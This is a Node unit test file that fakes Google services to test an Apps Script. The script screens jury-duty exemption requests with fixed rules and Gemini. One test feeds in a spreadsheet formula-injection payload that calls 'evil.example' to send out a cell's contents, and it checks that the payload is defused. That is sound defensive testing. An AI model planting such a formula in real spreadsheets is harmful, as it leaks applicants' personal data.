// apps-script/Code.gs 的單元測試：用假的 SpreadsheetApp／UrlFetchApp 在 Node 裡執行 Apps Script。
// 示範「怎麼測一個只能在 Google 上跑的程式」：把 Google 的服務換成記憶體裡的假物件。
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const CODE = fs.readFileSync(path.join(__dirname, '..', 'apps-script', 'Code.gs'), 'utf8');
const HEAD = ['時間戳記', '候選人編號', '你的回覆', '勾選的事由', '具體情況說明'];

/* ---------- 假的 Google 服務 ---------- */
function makeSheet(name, rows) {
  const data = rows.map(r => r.slice());
  const sheet = {
    data, name, bg: {},
    getName: () => name,
    getLastRow: () => data.length,
    getLastColumn: () => Math.max(0, ...data.map(r => r.length)),
    getRange: (r, c, nr = 1, nc = 1) => range(sheet, r, c, nr, nc),
    getDataRange: () => range(sheet, 1, 1, Math.max(1, data.length), Math.max(1, sheet.getLastColumn())),
    clearContents: () => { data.length = 0; },
    insertRowBefore: () => { data.unshift([]); },
    setColumnWidth: () => {},
  };
  return sheet;
}
function range(sheet, r, c, nr, nc) {
  const d = sheet.data;
  const get = (i, j) => { const row = d[i - 1] || []; return row[j - 1] === undefined ? '' : row[j - 1]; };
  const set = (i, j, v) => { while (d.length < i) d.push([]); const row = d[i - 1]; while (row.length < j - 1) row.push(''); row[j - 1] = v; };
  const self = {
    getValue: () => get(r, c),
    setValue: v => { set(r, c, v); return self; },
    getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => get(r + i, c + j))),
    setValues: vals => { vals.forEach((row, i) => row.forEach((v, j) => set(r + i, c + j, v))); return self; },
    setBackground: col => { sheet.bg[r + ',' + c] = col; return self; },
    setFontWeight: () => self, setWrap: () => self,
  };
  return self;
}
function makeEnv({ rows = [], props = {}, llm = [], extraSheets = {} } = {}) {
  const sheets = [makeSheet('表單回應 1', [HEAD, ...rows])];
  for (const [n, r] of Object.entries(extraSheets)) sheets.push(makeSheet(n, r));
  const ss = {
    getSheets: () => sheets,
    getSheetByName: n => sheets.find(s => s.name === n) || null,
    insertSheet: n => { const s = makeSheet(n, []); sheets.push(s); return s; },
    toast: msg => { env.toasts.push(msg); },
    setActiveSheet: () => {},
  };
  const menu = { addItem: () => menu, addSeparator: () => menu, addToUi: () => {} };
  const env = {
    toasts: [], llmCalls: [], heldDuringFetch: [], lockHeld: false, ss,
    SpreadsheetApp: { getActive: () => ss, getUi: () => ({ alert: () => {}, createMenu: () => menu }) },
    Utilities: { formatDate: () => '2026-11-04 10:00', sleep: () => {} },
    PropertiesService: { getScriptProperties: () => ({ getProperty: k => (k in props ? props[k] : null) }) },
    // 記錄鎖的狀態：呼叫 Gemini 時不可以鎖著（不然同時送出的人會拿不到鎖）
    LockService: { getScriptLock: () => ({ waitLock: () => { env.lockHeld = true; }, releaseLock: () => { env.lockHeld = false; } }) },
    ContentService: { MimeType: { JSON: 'json' }, createTextOutput: s => ({ body: s, setMimeType() { return this; } }) },
    UrlFetchApp: {
      fetch: (url, opt) => {
        env.llmCalls.push(JSON.parse(opt.payload).contents[0].parts[0].text);
        env.heldDuringFetch.push(env.lockHeld);
        const next = llm.length ? llm.shift() : { code: 500, body: {} };
        return { getResponseCode: () => next.code, getContentText: () => JSON.stringify(next.body) };
      },
    },
  };
  vm.createContext(env);
  vm.runInContext(CODE, env);
  env.sheet = sheets[0];
  return env;
}
const geminiSays = obj => ({ code: 200, body: { candidates: [{ content: { parts: [{ text: JSON.stringify(obj) }] } }] } });
/** 讀某一列的 AI 欄位，回傳 {欄名: 值} */
function aiOf(env, row) {
  const head = env.sheet.data[0];
  const o = {};
  head.forEach((h, i) => { if (i >= HEAD.length) o[h] = env.sheet.data[row - 1][i]; });
  return o;
}
const submit = (env, row) => env.onFormSubmit({ range: { getSheet: () => env.sheet, getRow: () => row } });

/* ---------- 測試 ---------- */

test('規則判得了的申請：不呼叫 Gemini，標「規則」', () => {
  const env = makeEnv({ rows: [['2026/11/04', 'C055', '申請免除', '年滿 70 歲以上', '我今年 72 歲。（附身分證影本）']], props: { GEMINI_API_KEY: 'k' } });
  submit(env, 2);
  const ai = aiOf(env, 2);
  assert.equal(env.llmCalls.length, 0);
  assert.equal(ai['AI 對應事由'], '年滿七十歲以上');
  assert.equal(ai['判斷來源'], '規則');
  assert.equal(ai['需人工確認'], '否');
  assert.equal(ai['書記官待辦'], '核對身分證明後送法官', '附件只是自述，不能寫「可直接送法官」');
});

test('AI 回傳公式時，寫進試算表前要變成純文字（防公式注入）', () => {
  const env = makeEnv({
    rows: [['t', 'C023', '申請免除', '有重大疾病、傷害或身心因素', '上個月剛做完心臟手術。']],
    props: { GEMINI_API_KEY: 'k' },
    llm: [geminiSays({ '對應事由': '=IMPORTDATA("https://evil.example/?"&E2)', '類型': '得拒絕', 'AI建議': '可能符合', '需人工確認': '否', '理由': 'x', '書記官待辦': 'y' })],
  });
  submit(env, 2);
  const ai = aiOf(env, 2);
  assert.equal(env.llmCalls.length, 1);
  assert.match(env.llmCalls[0], /<申請內容>[\s\S]*心臟手術[\s\S]*<\/申請內容>/);
  assert.ok(ai['AI 對應事由'].startsWith("'="), '應該加上 \' 前綴：' + ai['AI 對應事由']);
  assert.equal(ai['需人工確認'], '是', '沒寫附件，AI 說「否」也不算');
});

test('非免除申請：標記略過，不呼叫 Gemini', () => {
  const env = makeEnv({ rows: [['t', 'C001', '到場', '', '']] });
  submit(env, 2);
  assert.equal(aiOf(env, 2)['AI 建議'], '（非免除申請，不需分類）');
  assert.equal(env.llmCalls.length, 0);
});

test('AI 失敗：標「待人工」，處理時間留空，之後補跑會再試', () => {
  const env = makeEnv({ rows: [['t', 'C046', '申請免除', '有重大疾病', '身體不好。']], props: { GEMINI_API_KEY: 'k' } });
  submit(env, 2); // 假 Gemini 一直回 500
  const ai = aiOf(env, 2);
  assert.equal(ai['判斷來源'], '待人工');
  assert.equal(ai['AI 處理時間'], '');
  assert.equal(ai['需人工確認'], '是');
});

test('候選人編號格式異常：一律人工確認', () => {
  const env = makeEnv({ rows: [['t', '王小明', '申請免除', '年滿 70 歲以上', '我今年 72 歲。（附身分證影本）']] });
  submit(env, 2);
  assert.equal(aiOf(env, 2)['需人工確認'], '是');
  assert.match(aiOf(env, 2)['書記官待辦'], /編號格式異常/);
});

test('題目順序改了也找得到欄位（用標題比對）', () => {
  const env = makeEnv({ rows: [] });
  env.sheet.data[0] = ['時間戳記', '具體情況說明', '候選人編號', '勾選的事由', '你的回覆'];
  env.sheet.data.push(['t', '我今年 72 歲。（附身分證影本）', 'C055', '年滿 70 歲以上', '申請免除']);
  submit(env, 2);
  const head = env.sheet.data[0];
  assert.equal(env.sheet.data[1][head.indexOf('AI 對應事由')], '年滿七十歲以上');
});

test('doGet：沒有存取碼或存取碼錯誤，不給資料', () => {
  const env = makeEnv({ rows: [['t', 'C001', '到場', '', '']], props: { DASHBOARD_TOKEN: 'secret-123' } });
  assert.equal(JSON.parse(env.doGet({ parameter: {} }).body).ok, false);
  assert.equal(JSON.parse(env.doGet({ parameter: { token: 'wrong' } }).body).ok, false);
  const ok = JSON.parse(env.doGet({ parameter: { token: 'secret-123' } }).body);
  assert.equal(ok.ok, true);
  assert.equal(ok.rows[0].id, 'C001');
  // 沒設定 DASHBOARD_TOKEN 時，任何存取碼（包含空字串）都不行
  const env2 = makeEnv({ rows: [['t', 'C001', '到場', '', '']] });
  assert.equal(JSON.parse(env2.doGet({ parameter: { token: '' } }).body).ok, false);
});

test('rebuildDashboard：輸出模組 4 格式，名冊上沒回覆的標「未回覆」', () => {
  const env = makeEnv({
    rows: [['t1', 'C001', '到場', '', ''], ['t2', 'C002', '尚未決定', '', ''], ['t3', 'C001', '申請免除', '年滿 70 歲以上', '我 75 歲（附身分證）']],
    extraSheets: { '通知名冊': [['候選人編號', '案號', '通知寄出日'], ['C001', '115年度國模重訴字第1號（模擬）', '2026/11/02'], ['C002', '同上', '2026/11/02'], ['C003', '同上', '2026/11/02']] },
  });
  env.rebuildDashboard();
  const rep = env.ss.getSheetByName('回覆資料').data;
  assert.deepEqual(rep[0], ['候選人編號', '案號', '通知寄出日', '回覆狀態', '回覆日期', '是否使用AI導覽', '免除事由（AI初篩）', '提問內容', '提問分類']);
  const status = Object.fromEntries(rep.slice(1).map(r => [r[0], r[3]]));
  assert.deepEqual(status, { C001: '申請免除', C002: '尚未決定', C003: '未回覆' }, '同一人回覆多次以最後一次為準');
  const fc = env.ss.getSheetByName('到場預測').data;
  assert.equal(fc[9][0], '預測到場人數');
  assert.match(fc[9][1], /^=ROUND/);
});

test('writeSummary：由程式統計，不呼叫 Gemini；同一人送出多次以最後一次為準', () => {
  const env = makeEnv({
    rows: [
      ['t1', 'C055', '申請免除', '年滿 70 歲以上', '我今年 72 歲。（附身分證影本）'],
      ['t2', 'C046', '申請免除', '有重大疾病、傷害或身心因素', '身體不好。'],
      ['t3', 'C090', '申請免除', '要照顧家人或養育小孩，執行職務有困難', '要照顧小孩。'],
      ['t4', 'C090', '到場', '', ''], // 撤回免除申請
    ],
    props: { GEMINI_API_KEY: 'k' },
  });
  env.classifyPending(); // 假 Gemini 一直回 500 → C046 待人工
  const calls = env.llmCalls.length;
  env.writeSummary();
  assert.equal(env.llmCalls.length, calls, '產生摘要不可以呼叫 Gemini');
  const text = env.ss.getSheetByName('書記官摘要').data[0][1];
  assert.match(text, /^共 2 筆免除申請/, 'C090 已改成到場，不算');
  assert.match(text, /C046：尚未分類/);
  assert.match(text, /核對附件後可送法官（1 筆）：C055/);
});

const AI_COLS = ['AI 對應事由', 'AI 類型', 'AI 建議', '需人工確認', 'AI 理由', '書記官待辦', 'AI 處理時間', '判斷來源', '規則版本'];
const needsAI = ['t', 'C023', '申請免除', '有重大疾病、傷害或身心因素', '上個月剛做完心臟手術。（附診斷證明）'];
const aiSaysOk = geminiSays({ '對應事由': '第16條第4款', '類型': '得拒絕', 'AI建議': '可能符合', '需人工確認': '否', '理由': '心臟手術', '書記官待辦': '可直接送法官' });

test('呼叫 Gemini 時不鎖；寫入時才鎖', () => {
  const env = makeEnv({ rows: [needsAI], props: { GEMINI_API_KEY: 'k' }, llm: [aiSaysOk] });
  submit(env, 2);
  assert.deepEqual(env.heldDuringFetch, [false]);
  assert.equal(env.lockHeld, false, '結束後要釋放');
  assert.equal(aiOf(env, 2)['判斷來源'], 'AI');
  assert.equal(aiOf(env, 2)['書記官待辦'], '核對附件（診斷證明）後送法官');
});

test('編號不在通知名冊：不送 AI，要人工確認', () => {
  const env = makeEnv({ rows: [needsAI], props: { GEMINI_API_KEY: 'k' }, llm: [aiSaysOk],
    extraSheets: { '通知名冊': [['候選人編號', '案號', '通知寄出日'], ['C001', '案A', '2026/11/02']] } });
  submit(env, 2);
  assert.equal(env.llmCalls.length, 0);
  assert.equal(aiOf(env, 2)['需人工確認'], '是');
  assert.equal(aiOf(env, 2)['書記官待辦'], '候選人編號不在通知名冊，請核對');
});

test('編號格式異常、規則又判不了：不送 AI', () => {
  const env = makeEnv({ rows: [['t', '王小明', '申請免除', '有重大疾病', '身體不好。']], props: { GEMINI_API_KEY: 'k' }, llm: [aiSaysOk] });
  submit(env, 2);
  assert.equal(env.llmCalls.length, 0);
  assert.match(aiOf(env, 2)['書記官待辦'], /編號格式異常/);
});

test('同一人後來又送出：舊的那筆不分類、不送 AI', () => {
  const env = makeEnv({ rows: [needsAI, ['t2', 'C023', '到場', '', '']], props: { GEMINI_API_KEY: 'k' }, llm: [aiSaysOk] });
  env.classifyPending();
  assert.equal(env.llmCalls.length, 0);
  assert.match(aiOf(env, 2)['AI 建議'], /同一人後來又送出/);
  assert.equal(aiOf(env, 2)['判斷來源'], '');
});

test('規則改版後：舊版規則判的列會用新規則重判，AI 判的不重跑', () => {
  const env = makeEnv({ rows: [], props: { GEMINI_API_KEY: 'k' },
    llm: [geminiSays({ '對應事由': '第16條第6款', '類型': '得拒絕', 'AI建議': '資料不足', '需人工確認': '是', '理由': '未說明為何只能由本人照顧', '書記官待辦': '請說明照顧需求' })] });
  env.sheet.data[0] = HEAD.concat(AI_COLS);
  // 舊版規則把「家母 85 歲」當成申請人自己的年齡
  env.sheet.data.push(['t1', 'C101', '申請免除', '要照顧家人或養育小孩，執行職務有困難', '我要照顧家母，她 85 歲了。（附戶口名簿影本）',
    '年滿七十歲以上', '得拒絕', '可能符合', '否', '自述 85 歲，≥ 70', '可直接送法官', '2026-11-01 10:00', '規則', '']);
  // AI 判的：不因規則改版重跑（不花 token）
  env.sheet.data.push(['t2', 'C102', '申請免除', '有重大疾病、傷害或身心因素', '身體不好。',
    '無', '無', '資料不足', '是', '沒有具體病名', '請補診斷證明', '2026-11-01 10:00', 'AI', '2026-11-04']);
  env.classifyPending();
  assert.equal(env.llmCalls.length, 1, '只有 C101 改交 AI');
  assert.match(env.llmCalls[0], /C101/);
  const a = aiOf(env, 2);
  assert.equal(a['判斷來源'], 'AI');
  assert.equal(a['AI 建議'], '資料不足');
  assert.equal(a['規則版本'], require('../lib/screening.js').RULES_VERSION);
  assert.equal(aiOf(env, 3)['AI 理由'], '沒有具體病名', 'AI 判的列不變');
  assert.match(env.toasts[0], /1 筆是舊版規則判的/);
});

test('到場預測：選任所需人數可用 NEEDED_PER_CASE 設定，多個案號會提醒是合計', () => {
  const env = makeEnv({ rows: [['t1', 'C001', '到場', '', '']], props: { NEEDED_PER_CASE: '40' },
    extraSheets: { '通知名冊': [['候選人編號', '案號', '通知寄出日'], ['C001', '案A', '2026/11/02'], ['C002', '案B', '2026/11/02']] } });
  env.rebuildDashboard();
  const fc = env.ss.getSheetByName('到場預測').data;
  assert.equal(fc[10][0], '選任所需人數（假設）');
  assert.equal(fc[10][1], 40);
  assert.match(fc[1][2], /2 個案號.*合計/);
});
